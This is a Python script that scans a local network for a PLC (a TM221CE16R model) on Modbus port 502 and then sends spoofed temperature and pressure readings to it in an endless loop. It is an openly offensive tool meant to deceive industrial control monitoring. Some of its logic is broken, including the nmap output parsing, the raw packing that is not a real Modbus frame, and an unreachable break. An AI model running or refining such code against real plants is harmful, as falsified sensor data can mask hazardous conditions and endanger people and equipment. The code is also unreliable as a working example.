import socket
import struct
import time
import subprocess  # For finding IP address

# Configuration
PLC_NAME = "TM221CE16R"  # Or a more specific identifier if available
# REPORTING_MESSAGE_STRUCTURE:  Define this based on your PLC's actual reporting message format
# This is a placeholder, you *MUST* replace this with the correct format.
# Example: Assuming a simple message with a float for temperature and an integer for pressure
REPORTING_MESSAGE_STRUCTURE = "<fi"  # little-endian float, little-endian integer
TEMPERATURE_SPOOF_VALUE = 25.0  # Spoofed temperature value
PRESSURE_SPOOF_VALUE = 100  # Spoofed pressure value
SLEEP_DURATION = 5  # seconds between spoofed messages


def find_plc_ip(plc_name):
    """
    Attempts to find the PLC's IP address on the network.

    Args:
        plc_name: The name or a partial identifier of the PLC.

    Returns:
        The IP address of the PLC, or None if not found.
    """

    try:
        # Use nmap to scan the network for devices matching the PLC name
        # Requires nmap to be installed and accessible in the system's PATH.
        # You might need to adjust the network range (e.g., "192.168.1.0/24")
        # depending on your network configuration.
        nmap_command = f"nmap -p 502 -T4 192.168.1.0/24"  # Port 502 is common for Modbus
        process = subprocess.Popen(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()

        if error:
            print(f"Error during nmap scan: {error.decode()}")
            return None

        output_str = output.decode()

        for line in output_str.splitlines():
            if plc_name.lower() in line.lower() and "up" in line.lower():
                parts = line.split()
                ip_address = parts[4]  # Adjust the index if the output format is different
                print(f"Found PLC IP: {ip_address}")
                return ip_address
                break
        print(f"PLC IP not found.")
        return None
    except FileNotFoundError:
        print("nmap is not installed or not in PATH. Please install nmap.")
        return None


def create_spoofed_message(temperature, pressure):
    """
    Creates a spoofed reporting message.

    Args:
        temperature: The spoofed temperature value.
        pressure: The spoofed pressure value.

    Returns:
        The spoofed message as bytes.
    """
    try:
        packed_message = struct.pack(REPORTING_MESSAGE_STRUCTURE, temperature, pressure)
        return packed_message
    except struct.error as e:
        print(f"Error packing message: {e}.  Check REPORTING_MESSAGE_STRUCTURE.")
        return None



def send_spoofed_message(plc_ip, spoofed_message):
    """
    Sends the spoofed reporting message to the PLC (or a monitoring system that listens for the PLC's reports).

    Args:
        plc_ip: The IP address of the PLC.
        spoofed_message: The spoofed message to send.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP socket.  Adjust if TCP is used.
        sock.sendto(spoofed_message, (plc_ip, 502))  # Send to port 502 (Modbus UDP). Change to correct port.
        print(f"Spoofed message sent to {plc_ip}:502")
        sock.close()
    except socket.error as e:
        print(f"Socket error: {e}")


def main():
    plc_ip = find_plc_ip(PLC_NAME)
    if not plc_ip:
        print("Could not find PLC IP address.  Exiting.")
        return

    while True:
        spoofed_message = create_spoofed_message(TEMPERATURE_SPOOF_VALUE, PRESSURE_SPOOF_VALUE)
        if spoofed_message:  # Only send if the message was created successfully
            send_spoofed_message(plc_ip, spoofed_message)
        time.sleep(SLEEP_DURATION)


if __name__ == "__main__":
    main()